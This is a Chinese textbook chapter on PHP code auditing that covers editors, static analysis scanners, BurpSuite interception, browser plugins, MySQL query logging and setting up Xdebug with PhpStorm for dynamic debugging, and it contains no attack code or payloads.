常用的轻量级代码编辑工具包括：Sublime Text、Notepad++、Editplus、UltraEdit等。此类工具普遍都支持编程语言高亮，全局搜索等特点。由于其启动快对文本操作方便，因此其适用于审计代码量小的PHP文件。

l 集成开发工具

常用的集成开发工具包括：Visual Studio Code（VS Code）、Zend Studio、PhpStorm、PhpDesigner等，此类工具设计之初为了程序开发便捷性，因此其具有的功能非常全面。此类工具常见的特点包括：支持不同语言高亮、对代码进行本地及远程调试功能、自动扫描代码语法错误等，但是功能的全面也导致的此类工具启动较慢且安装困难。因此此类工具更适用于审计开源框架程序，大型CMS等复杂程序。

本节介绍三款适用于PHP代码的编辑工具：Sublime、VS Code、PhpStorm。

（1）Sublime Text

Sublime Text是一款跨平台且识别多种语言的文件编辑器，Sublime Text支持安装在MacOS、Linux、Windows平台上，使用工具可以编辑HTML、CSS、JavaScript、PHP等应用程序。因为其体积小、扩展性强、打开文本速度快等优点，目前已经被很多计算机领域工作者使用。当代码审计量比较小时，通常建议直接使用Sublime Text查看代码。下面对该工具特点进行介绍：

l 支持多种编码格式

Sublime Text支持字符编码包括：ISO8859、UTF-8、GBK、GB2312等，用户可通过“File”->“Reopen with Encoding”选项卡设置编码字符集解决乱码问题。如图1-14所示。

l 支持外挂插件

Sublime Text拥有强大的课可扩展性，用户可根据自己的需要安装不同的插件，例如：FileDiffs（文件比较）、MarkDown Editing（查看和编辑MarkDown文件）、Alignment（代码自动对齐）、Git（将Git该工具中）等。用户可通过点击“Preferences”中“Package Control”按钮进行插件的搜索，如图1-15所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image032.jpg)

图1-14 Sublime Text设置编码图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image034.jpg)

图1-15 Sublime插件图

（2）VS Code

VS Code是微软公司开发的一款跨平台的源代码编辑器。该工具除了支持PHP语言外，还支持C++、Java、Python、Go等语言。图1-16为VS Code工具界面，该界面包括是三个部分：活动栏、侧边栏、编辑栏。

l 活动栏：从上至下依次为：搜索、使用Git、debug调试、使用插件；

l 侧边栏：用于浏览项目文件或文件夹结构；

l 编辑栏：用于代码编辑。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif)

图1-16 Visual Code界面

VS Code工具的特点如下：

l 支持Windows、Linux、Mac多操作系统版本；

l 工具完全开源免费且集成Git；

l 支持多种文件格式，包括：HTML、CSS、XML、Less等；

l 支持强大的插件扩展功能；

l 支持调试功能。

（3）PhpStorm

PhpStorm是JetBrains公司开发的一款商业PHP集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航及即时错误检查功能。图1-17为PhpStorm工具的项目界面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif)

图1-17 PhpStorm界面

近几年由于JetBrains公司开发的各款IDE逐渐流行，在进行代码开发与代码审计时此款工具也受到很多计算机从业者的青睐。在审计大型CMS、PHP常用框架时也推荐使用该工具，这主要因为该工具包括以下特点：

l 支持语法高亮、自动补全、自动扫描检测PHP代码中语法错误；

l 与Zend Studio相比，该工具属于轻量级集成开发工具，启动速度略快；

l 支持本地调试与远程调试，有利于代码审计与流程走读。

## 1.5 自动代码审计工具

在源代码的静态安全审计中，使用自动化工具代替人工漏洞挖掘，可以显著提高审计工作的效率。使用自动化代码审计工具，是每一个代码审计人员的必备能力。本节将介绍四款PHP源代码审计工具，包括：Seay、RIPS、VCG、Fortify SCA。

### 1.5.1 Seay代码审计工具

Seay代码审计工具是由阿里巴巴公司尹毅使用C#开发的一款运行于Windows操作系统的PHP代码安全审计系统。该系统可以审计常见的Web安全漏洞，如：SQL注入、代码执行漏洞、命令执行漏洞、XSS等。在对PHP代码进行白盒测试时，使用Seay代码审计系统进行代码审计往往是辅助代码白盒测试的一种方法。很多初学者在学习代码审计时都会首选Seay系统，这主要是因为该工具安装简单、审计简单、开源、学习简单等特点。

该系统支持的功能包括：代码自动审计、代码调试、函数定位、插件扩展、自定义规则配置、数据库执行监控等。

下面对Seay代码审计工具的常见功能进行介绍。

（1） 代码自动审计

用户点击“新建项目”按钮导入项目，然后在菜单栏中点击“自动审计”再点击“开始”按钮即可对已创建项目进行自动化审。当审计系统发现可能存在漏洞的代码后将把审计结果打印至列表框。用户可以通过双击感兴趣的漏洞选项定位至指定代码，同时定位的代码将以高亮形式显示，图1-18为代码自动审计结果图。注意：由于程序在开发过程中使用的编码方式不同将导致Seay导入项目后存在乱码情况，这需要用户点击“编码”选项切换为不显示乱码的编码方式。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image040.jpg)

图1-18 Seay自动审计图

（2） 定位函数功能

定位函数功能将从程序代码中迅速定位出指定函数的位置，该功能在使用敏感函数参数回溯法时发挥作用。假设用户在进行代码审计时发现dvwaHtmlEcho函数需要查看，可以通过右键该函数，然后点击“定位函数”查看该函数在程序中的具体实现代码，从而快速对分析该函数内容，如图1-19所示

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image042.jpg)

图1-19 Seay定位函数功能图

（3）全局搜索

用户可通过在选项卡中选择“全局搜索”功能，然后在内容处输入搜索关键字即可在项目中全局搜索指定内容。该方法可用于搜索常见Web安全漏洞的关键函数，例如：Web安全漏洞的文件包含漏洞的常见函数include、include_once、require、fopen都可通过全局搜索功能进行查找，如图1-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image044.jpg)

图1-20 Seay全局搜索图

（4）代码调试

  该功能可用于对部分代码进行执行，分析其执行结果。用户可通过选中待测试代码，然后右键点击“调试选中”切换至调试界面观察PHP代码执行结果，如图1-21所示。但是，该功能只能用于简单的PHP代码调试，复杂代码建议使用IDE开发工具进行单步调试效果更佳。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image046.jpg)

图1-21 Seay代码调试功能图

（5）审计插件功能

Seay源代码审计工具支持安装审计插件，插件的开发非常简单，只需要将插件的dll文件放入到安装目录下的plugins文件夹内即可自动加载插件。该系统将默认提供三款插件，如图所示：信息泄露审计、Mysql监控1.0、测试插件1.0。

l 信息泄露审计：通过输入“站点地址”和“Cookie”对指定的URL路径进行信息泄露扫描，对该站点敏感信息进行收集。

l Mysql监控：通过输入“主机”、“用户”、“密码”连接主机的MySQL数据库，查看数据库执行的SQL语句并与后端代码结合审计代码。

l 测试插件：该插件用来测试Seay审计工具的运行情况，测试的功能包括：“修改标题”、“增加tab”、“获取编码”、“获取路径”。

### 1.5.2 RIPS代码审计工具

RIPS是一款具有较强漏洞挖掘能力的自动化代码审计工具。该工具使用PHP语言编写的，可用于静态审计PHP代码的安全性。该工具可检测XSS、SQL注入、文件泄露、文件包含等多种安全漏洞。该工具的特点包括：标记漏洞的代码行、函数定义和调用灵活跳转、可视化图表等。对于一款免费的开源代码审计工具而言，RIPS已经做得相当不错了，因为它不仅是一款自动定位漏洞的扫描器，同时更侧重于如果发现代码问题、利用漏洞、修复漏洞方面。

（1）代码自动审计

用户可通过在“path/file”选项中输入需审计的代码路径，然后填写扫描设置选项即可点击“scan”按钮完成自动化扫描。图1-22为RIPS扫描DVWA靶场平台的扫描结果。RIPS扫描结果通过可视化图形使得扫描结果更加直观。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image048.jpg)

图1-22 RIPS扫描结果图

（2）扫描结果分类显示

RIPS支持四种类型显示或隐藏扫描结果，分别是：file（扫描文件）、user input（用户输入）、stats（扫描状态）、functions（扫描的函数）。用户可通过点击指定漏洞查看存在漏洞的PHP代码及代码位置。图1-23给出RIPS扫描结果中可能存在命令执行漏洞的代码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image050.jpg)

图1-23 命令注入漏洞扫描图

### 1.5.3 VCG代码审计工具

VCG是一款用于C++、C、PHP、Java的自动化代码安全审查工具，它基于字典实现扫描功能，从而对源代码中所有可能存在的风险函数和文本做快速定位。通过匹配字典的方式查找可能存在风险的源代码片段。与RIPS侧重点不同，该工具并不深度发掘应用漏洞。它只能作为一个快速定位源代码风险函数的辅助工具使用。

使用前用户点击Setting选项，选择扫描的目标语言类型。然后点击File->New Target Directory选项，选择需要扫描的源代码文件存放目录，点击Scan->Full Scan选项进行扫描。图1-24为VCG扫描DVWA平台的结果，PHP代码将按照安全威胁等级进行划分，同时会列举出可能存在安全问题的代码行数及变量名称等。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image052.jpg)

图1-24 VCG审计工具界面

### 1.5.4 Fortify SCA代码审计工具

Fortify SCA是一款商业代码审计工具。该工具虽价格昂贵，但配有详细的使用文档且查阅方便。Fortify SCA的代码审计功能依赖于该公司内部开发的规则库文件，可以通过下载最新的规则库，将规则库拷贝至安装目录下进行使用。

该工具的特点包括：

l 支持IDE插件功能，能与现有的集成开发工具联动审计；

l 相比于开源审计软件，其审计结果更加详细；

l 基于五种分析引擎（数据流、控制流、语义、结构、配置）进行代码静态分析；

l 目前支持语言审计最多的代码审计工具（Java、JSP、PHP等多种语言）；

RIPS和Fortify SCA都是静态深度分析源代码漏洞的利器，它们使用各自的技术对应用程序执行过程进行了追踪分析，并进行深层次的漏洞挖掘工作。RIPS易于部署和使用，可以作为简单应用功能的自动化审计分析工具。而Fortify SCA功能更为强大，可以胜任较为复杂的应用自动化分析。在实际审计工作中可以结合使用两种工具，取长补短。

自动化的静态代码审计工具可以节省代码审计的人力成本，是提高代码审计效率的重要手段。但自动化工具并非完全智能，与所有的漏洞扫描工具一样，误报率仍是一个现实的问题。因此，报表中显示的漏洞需要审计人员进一步确认。此外，自动化工具还有一个很大的局限性：它仅能够对常见的Web应用漏洞类型进行挖掘，对于业务逻辑漏洞挖掘可以说是束手无力。所以，对于有经验的代码审计人员来说，审计工具起到的仅仅是辅助作用，他们会在利用工具的基础上结合自己经验挖掘出更深层次的漏洞。

### 1.5.5 自动化审计工具部署

1、Seay审计工具部署

  Seay审计工具只支持Windows版本，通过下载Seay代码审计工具zip压缩包，解压并点击“Seay源代码审计系统.exe”程序进行安装，然后根据安装程序向导点击“下一步”直至安装完成，图1-25为Seay代码审计工具安装向导。安装成功后，程序将自动创建Seay审计工具的快捷方式，点击即可开始审计。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image054.jpg)

图1-25 Seay代码审计工具安装图

2、RIPS审计工具部署

目前RIPS最新版本是2017年6月更新的RIPS0.55版本。RIPS审计工具由PHP开发，通过Web界面的方式访问并使用。用户可在Windows或Linux系统下搭建PHP及Apache服务，也可使用PhpStudy等集成化工具。然后，将RIPS文件夹复制到网站的根路径即可完成安装。使用浏览器输入IP地址为：http://127.0.0.1/rips-0.55/即可访问RIPS，如图1-26所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image056.gif)

图1-26 RIPS代码审计工具访问图

3、VCG审计工具部署

目前VCG最新版本是2019年10月更新的VCG2.2.0版本，用户将下载VCG安装包，然后双击“VCD-Setup.msi”运行文件，选择“Repair VisualCodeGrepper”选项进行安装，如图1-27所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image058.jpg)

图1-27 VCG代码审计工具安装图

## 1.6 代码审计辅助工具

在进行代码审计的过程中，很多代码为了保证数据的安全性都会使用过滤函数及编码解密设置，而这些函数的严谨性都需要进行反复测试。无论是分析数据在程序流程中的变化，还是验证EXP是否可行，都需要借助一些辅助工具来加速测试漏洞。本节将介绍代码审计过程中常用的辅助工具，分别是：数据包分析工具、浏览器辅助插件、编解码工具、正则表达式测试工具、数据库监控工具。

### 1.6.1 数据包分析工具

BurpSuite是数据包分析的必备工具之一，代码审计过程中，为了调试程序流程及测试安全漏洞，通常使用BurpSuite拦截HTTP或HTTPS请求，从而对请求数据包进行分析。除此之外，还具备网站目录扫描、漏洞扫描、漏洞分析、暴力破解等功能。

BurpSuite的主要模块有：目标网站（target）、代理（proxy）、中继（repeater）、入侵（intruder）、编码（decoder）、编辑器（sequencer）、对比（comparer）等，图1-28为BurpSuite模块界面。

l 目标（target）。该模块可以显示对端网站的目录结构。

l 代理（proxy）。该模块主要用于拦截HTTP、HTTPS的代理服务器。通过设置代理，BurpSuite可以作为浏览器与目标应用程序的中间人，从而拦截、查看、修改两个方向的数据流。

l 中继（repeater）。在设置代理的基础上，中继功能可以通过手动方式将已经拦截的请求进行重新发送，也可以将单个HTTP请求进行修改并重发。

l 入侵（intruder）。定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing技术探测常规漏洞。

l 编码（decoder）。该模块可以将字段进行编码与解码，对请求参数进行解析。

l 编辑器（sequencer）。该模块用于分析数据项中的随机性质量工具。可以用它来测试应用程序的session、会话或一些web安全漏洞，比如：反弹CSRF tokens，密码重置tokens等。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image060.jpg)

图1-28 BurpSuite模块界面

### 1.6.2 浏览器辅助插件工具

在代码审计过程中使用浏览器辅助工具包括：开发者工具F12、SwtichOmega、Web Developer、HackBar等，本节将对常见抓包工具进行介绍。

（1）  浏览器开发者工具F12

浏览器开发者工具通常在开启浏览器后，点击“F12”按钮即可打开。在开启状态下点击网页即可嗅探HTTP发送的请求（Request）和响应（Response）数据包。与此同时，该工具还可以通过“选取页面中元素”功能查看前台页面代码，该功能在开发过程中通常用于定位前台页面代码位置并调试前台代码，在审计过程中可对有前台校验的一些XSS、SQL注入、支付漏洞等页面进行定位与代码审计，图1-29为浏览器开发者工具界面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image062.jpg)

图1-29 开发者工具界面

（2）  HackBar扩展工具

Hackbar是一款插件，该工具无论是Web渗透还是代码审计都发挥着重要作用，其用来定制HTTP数据包进行发送，定制内容包括：POST方法、GET方法、Referer字段、Cookie字段等。该工具还具有编码解码功能，在审计过程中非常实用，图1-30为HackBar工具界面。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image064.jpg)

图1-30 HackBar工具界面

（3）  SwtichOmega扩展工具

SwitchyOmega是一款Chrome浏览器的代理扩展程序，其可以实现快捷地管理和切换多个代理设置。用户可通过访问SwitchyOmega官网下载Chrome插件版本进行安装，安装完毕后，其默认存在两种情景：代理服务器模式（名为proxy）和自动切换模式（auto switch）。同时，用户可以新建情景或在原有基础上修改代理设置，通过点击浏览器右上角“圆形”图标进行代理服务器设置，如图1-31所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image066.jpg)

图1-31 SwitchyOmega工具界面

（4）  Web develplor扩展工具

Web Developer是一款Web开发人员必备的浏览器实用插件，它支持开发人员便捷地对网页的HTML、脚本、多媒体、CSS、缓存、图像等网页内容进行调试。安装之后会在浏览器工具栏添加一个齿轮状图标，点击该图标后就可看到大量的Web开发工具，如图1-32所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image068.jpg)

图1-32 Web Developer工具界面

### 1.6.3 实验：BurpSuite数据包拦截

· 实验介绍

本实验使用BurpSuite中的代理模块进行配置，进行一次HTTP请求的拦截过程，然后修改数据包内容并使用repeater模块重发。

· 预备知识

参考1.6.1节：数据包分析工具；1.6.2节：浏览器辅助插件工具

· 实验目的

掌握使用BurpSuite代理配置方法；

掌握使用BurpSuite重发数据包方法。

· 实验环境

Windows操作系统主机（已安装BurpSuite、Chrome浏览器）。

· 实验步骤

点击BurpSuite中的功能模块中的“proxy”模块，该模块将为BurpSuite工具配置代理。然后点击“Options”选项进行该模块的配置工作，默认情况下BurpSuite会给出默认的代理监听器“Proxy Linstener”配置内容为“127.0.0.1:8080”（使用本机的8080端口作为代理转发数据包）。也可以选择想要配置的主机与端口，形式为：“要监听的主机IP地址：使用的代理端口”，例如：192.168.0.1:8888。如果只在本机进行配置，则使用默认配置即可，如图1-33所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image070.jpg)

图1-33 BurpSuite代理设置

为BurpSuite配置好代理以后，我们需要为主机的浏览器也配置同样的代理，这样Web数据包才能从浏览器转发到代理。Chrome浏览器中使用SwitchOmega进行代理配置。配置顺序为：点击“SwitchOmega图标”à“选项”à “proxy”。需要注意的是：浏览器代理的配置要与BurpSuite中的代理配置相同，由于上一步BurpSuite中配置的代理为“127.0.0.1:8080”，因此，浏览器中proxy也为“127.0.0.1:8080”，如图1-34所示。

**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image072.jpg)**

图1-34 浏览器代理配置图

代理设置成功以后，开始使用BurpSuite进行HTTP数据包的拦截工作，首先点击“proxy”模块，然后选择拦截器“Intercept”，可以看到存在“Forward”、“Drop”、“Intercept is off”、“Action”四个选项，这四个选项分别表示“将拦截的数据包进行转发”、“将拦截的数据包丢弃”、“拦截器关闭与开启”、“将数据包进行下一步操作”，如图1-35所示。可以单击“Intercept is off”选项开启拦截器从而拦截HTTP数据包。

**![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image074.jpg)**

图1-35 拦截器选项图

开始进行HTTP数据包拦截，首先点击“Intercept is off”选项，当该按钮切换为“Intercept is on”，说明拦截器已经打开。通过浏览器访问HTTP网页，这里以上文搭建的74CMS为例，当访问网址为“http://192.168.0.7/74cms30/user/login.php”时，浏览器并没有显示网页页面，其请求数据包被BurpSuite工具拦截，打开BurpSuite可以看到其HTTP数据包，如图1-36所示。

注意：本实验只给出拦截HTTP请求的过程，若使用BurpSuite拦截HTTPS请求，请自行为浏览器安装CA证书。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image076.jpg)

图1-36 拦截HTTP数据包

右键上述数据包，点击“send to repeater”将数据包发送至Repeater模块，然后点击“Repeater”选项切换界面，同时可以看到被拦截的数据包已经在Repeater模块等待发送，点击“Go”发送数据包，查看数据包响应结果，响应状态码为200。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image078.jpg)

图1-37 重发数据包图

### 1.6.4 编解码工具

在代码审计过程中，使用编码工具对数据进行编码与解码是基本工作之一，很多时候需要使用不同的编码来进行模糊漏洞测试，同时很多漏洞也都由于编码问题产生。例如：SQL注入中绕过过滤函数addslashes问题上，存在url编码绕过、json编码绕过、base64编码绕过等；在XSS漏洞也可利用不同编码方式绕过过滤函数。

加解密工作在进行代码审计时也是测试工作之一。因为考虑到安全问题，很多程序对字符串进行加密保护，例如：将用户登录密码与salt（盐值）组合进行md5加密、字符串经过Hash算法加密作为网站Cookie或Session。下面对常用编码及加解密工具进行介绍。

l 线下编码工具

CaptfEncode V2工具支持多种加解密及编解码方式，是一款既小巧又功能强劲的线下编码工具，图1-38为CaptfEncode V2界面图。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image080.gif)

图1-38 CaptfEncoder V2界面图

l 在线编码加解密工具

很多网站提供了在线编码及加解密工具，下面介绍一款在线网站“CTF在线工具”，如图1-39所示。它具有常用编码方式及密码算法，用户将字符串复制到指定算法下即可进行加解密及编码测试。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image082.jpg)

图1-39 在线加解密工具图

### 1.6.5     正则表达式测试工具

正则表达式的应用场景很多，例如：用户名、邮箱、手机号等格式的过滤，博客论坛搜索功能的过滤等。网站开发阶段通常对传递的参数进行正则表达式过滤，如果用户输入内容符合正则表达式要求则允许数据传递，否则拒绝。由于正则表达式需要非常严谨，开发者通常需要对各种情况综合考虑。不严格的正则表达式将导致各种漏洞。因此，代码审计中检查正则表达式也属于工作之一。审计人员往往测试各种可绕过正则表达式的情况，下面介绍正则表达式调试工具。

很多网站提供正则表达式调试功能，用户可将待测试正则表达式、测试字符串粘贴进网站即可进行结果匹配测试，如图1-40所示。此类网站除匹配正则表达式功能外，还包括：常用需求正则表达式查询、根据正则表达式生成各种语言代码、文本替换、正则表达式语法参考等功能。除在线工具外，在人工代码审计过程中，很多安全人员也使用动态调试功能进行正则表达式审计。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image084.jpg)

图1-40 正则调试工具图

### 1.6.6 数据库执行监控

代码审计过程使用SQL注入执行监控工具可以协助审计人员调试该漏洞，本小节将对MySQL数据库的监控工具进行介绍。

l MySQL监控配置与查看

MySQL日志包括：普通日志（general Log）、慢查询日志（slow Log）、错误日志（error Log）。默认情况下，MySQL中普通日志是关闭的，这是因为MySQL会不断记录日志并对系统产生开销。无论查询语句是否正确，普通日志都将记录数据库每次执行操作。

对SQL语句进行监控，需要修改Mysql全局变量来开启普通日志功能。

  查看普通日志开启情况



show global variables like '%general%';



执行结果如1-41所示，若general_log值为OFF，则查询日志功能关闭，反之开启。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image086.jpg)

图1-41 general_log开启图

  开启查询日志命令



set global general_log=on;



  MySQL执行监控包括两种记录方式：将执行语句记录到文件中；将执行语句记录到数据库的general_log表中。

查看日志保存方式的命令。



show variables like 'log_output';



执行结果如1-42所示，若log_output值为TABLE，则说明日志保存于general_log表中，反之则保存于日志文件中。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image088.jpg)

图1-42 保存于日志图

  设置将日志保存于数据库中命令



SET GLOBAL general_log=on;

SET GLOBAL log_output='table';



  设置将日志保存于文件中命令



SET GLOBAL general_log=on;

SET GLOBAL log_output='file';



这样设置后查询记录就会保存在文件中，日志文件的保存路径可以在MySQL配置文件my.ini中[mysqld]部分加入如下代码进行设置，最后重启MySQL数据库即可。



general_log=ON

general_log_file={日志路径}/query.log



l Seay监控MySQL执行案例

Seay代码审计工具中“审计插件”->“mysql监控1.0”插件可监控数据库执行情况。用户可通过输入监控主机IP、数据库用户名密码连接数据库进行监控，如图1-43所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image090.jpg)

图1-43 数据库执行监控图

以74CMS登录功能为例，监控数据库执行情况。Seay窗口点击“下断”按钮，在CMS界面使用用户名登录，输入任意用户名密码进行登录，如图1-44所示。在Seay窗口点击“更新”查看登录功能执行的SQL语句列表，如图1-45所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image092.jpg)

图1-44 某平台登录图

![图片6](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image094.gif)

图1-45 Seay数据库监控图

## 1.7 代码审计动态调试环境搭建

本小节介绍PHP代码动态调试的环境搭建。无论是数据流分析、程序流程分析、测试EXP、数据库执行监控都需要动态调试。与静态审计代码相比，动态调试更为生动直观，使用IDE集成工具动态调试代码是必备技能。

PHP动态调试环境搭建需要配置的内容包括：

l PHP扩展插件Xdebug的安装与配置；

l 浏览器Xdebug helper插件的安装；

l PhpStorm集成环境配置远程调试。

本节首先介绍PHP动态环境调试原理，然后介绍PHP动态环境搭建。

### 1.7.1 动态调试原理

在未配置动态调试环境前流程图如1-46所示。浏览器触发HTTP请求，HTTP数据包通过Apche中间件转发至后台PHP代码处理。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image096.jpg)

图1-46 未配置动态调试流程图

PHP动态调试环境搭建需要包括：PHP、Xdebug、PhpStorm。动态调试环境后流程图如1-47所示。调试环境开启后由Xdebug负责，PHP代码调试流程转发至PhpStorm。

l 首先使用浏览器触发HTTP请求，正常业务数据流与未调试环境相同。

l PhpStorm开启9000端口监听，Xdebug接收PHP的正常业务流程转发至集成环境PhpStorm。

l PhpStorm与服务器PHP中的代码进行同步协调控制，从而动态调试PHP代码。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image098.jpg)

图1-47 动态调试流程图

### 1.7.2  Xdebug安装与配置

使用集成IDE进行动态调试的必备条件是为PHP配置Xdebug。Xdebug是PHP语言中的扩展，它是一个开源的PHP程序调试器。Xdebug支持Linux、MacOS、Windows系统，本节将以Windows为环境介绍Xdebug配置方法。

Xdebug的主要功能包括：

l IDE的单步调试器，可以用来跟踪、调试、分析PHP程序的运行状况；

l 记录函数的调用和向磁盘分配变量的功能。 

Xdebug的安装配置流程如图1-48所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image100.jpg)

图1-48 Xdebug安装配置流程图

1、下载Xdebug

由于PHP默认未安装Xdebug插件，因此需从Xdebug官网下载，图1-49为下载界面。注意：下载的Xdebug版本要与本机安装的PHP环境版本相匹配，否则可能出现无法调试的情况。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image102.jpg)

图1-49 Xdebug下载界面

2、安装Xdebug

Windows系统中需将下载的dll文件拷贝至本机PHP环境的ext目录下。若使用PhpStudy集成环境，则需在集成环境中开启Xdebug。

3、配置PHP

在PHP配置文件php.ini中增加Xdebug配置，添加内容如下：



[XDebug]

zend_extension="D:\Program Files\phpStudy\PHPTutorial\php\php-5.4.45\ext\php_xdebug.dll"             //xdebug查看位置

xdebug.idekey=PHPSTORM             //连接秘钥

xdebug.remote_enable=on             //是否开启远程调试

xdebug.remote_host=localhost          //远程连接IP

xdebug.remote_port=9000             //调试端口

xdebug.remote_handler=dbgp             //连接协议

xdebug.auto_trace=on



添加成功后重启Apache服务，网站根路径下编写1.php内容为<?php phpinfo();?>。访问该网页时若发现Xdebug，则说明安装配置成功，如图1-50所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image104.jpg)

图1-50 Xdebug信息图

### 1.7.3 浏览器Xdebug helper安装

  配置成功Xdebug后，为浏览器安装扩展插件Xdebug helper，在浏览器点击“设置”->添加组件->搜索Xdebug helper安装插件，如图1-51所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image106.jpg)

图1-51 Xdebug helper插件图

安装后浏览器url右侧将出现“昆虫”图标，点击昆虫中“Debug”选项，开启浏览器调试，如图1-52所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image108.jpg)

图1-52 Xdebug开启图

### 1.7.4 PhpStorm配置远程调试

1、选择指定的PHP版本

本节使用PhpStudy启动且PHP版本为5.4。因此，需要为PhpStorm配置与之匹配的PHP环境，点击File->Setting->languages&Framework->PHP->选定版本，配置方法如图1-53所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image110.jpg)

图1-53 选定PHP版本图

2、配置Debug调试器端口

点击File->Setting->languages&Framework->PHP->Debug配置调试器端口，该调试器配置应与Php.ini中的配置文件内容匹配，如图1-54所示。

Xdebug参数说明：

l zend_extension：加载Xdebug模块。 

l Xdebug.auto_trace：自动打开“监测函数调用过程”功能。 

l Xdebug.remote_enable：控制Xdebug是否应该连接一个按照Xdebug.remote_host和Xdebug.remote_port来监听主机和端口的debug客户端。

l Xdebug.remote_host：debug客户端正在运行的主机。

l Xdebug.port：debug连接远程主机的端口。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image112.jpg)

图1-54 调试端口配置图

3、配置调试代理

点击File->Setting->languages&Framework->PHP->Debug->DBGP Proxy配置调试代理，该调试器配置也应与Php.ini中的配置文件内容匹配。注意：localhost与127.0.0.1都表示本机服务器，如图1-55所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image114.jpg)

图1-55 调试代理设置图

4、配置服务器与目录对应

点击File->Setting->languages&Framework->PHP->Servers配置预调试服务器，如图1-56所示。

l 首先点击“+”添加预调试服务器，为该Server命名；

l 在Host中输入预调试服务器IP地址，HTTP服务端口为80，并选择调试器；

l 填写IDE中代码文件路径与服务器中代码文件路径（两个文件路径及文件中代码内容必须完全对应才能够调试正常，否则会出现无法调试或代码调试不同步问题）。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image116.jpg)

图1-56 调试服务器配置图

5、配置调试器

点击Run->Edit Configurations->“+”->PHP Remote Debug添加调试配置。调试器中Server应与上述创建Server名称匹配，IDE key应与php.ini文件中IDE Key匹配，如图1-57所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image118.jpg)

图1-57 调试配置图

6、调试方法介绍与测试

  图1-58为PHP，分为三个部分：调试器、断点区域、PHP代码。

l 断点区域：可在预调试代码左侧点击空白区域为代码打断点；

l 调试器（断开或连接调试）：调试前应点击调试连接按钮打开调试器连接；

l 开启调试：点击“昆虫”图标打开调试。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image120.jpg)

图1-58 调试方法图

对配置好的动态调试环境进行测试。首先创建内容为<?php phpinfo();?>的1.php文件，并于phpinfo();处设置断点，当使用浏览器访问该页面代码时，代码截断如图1-59所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image122.jpg)

图1-59 调试断点图

图1-60为动态调试流程，首先配置PhpStorm调试环境，并为指定代码设置断点，开启PhpStorm中的调试器。然后使用浏览器的Debug模式访问指定页面触发请求，最后查看断点处代码是否拦截并进行分析。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image124.jpg)

图1-60 调试流程图

## 1.8 单元小结

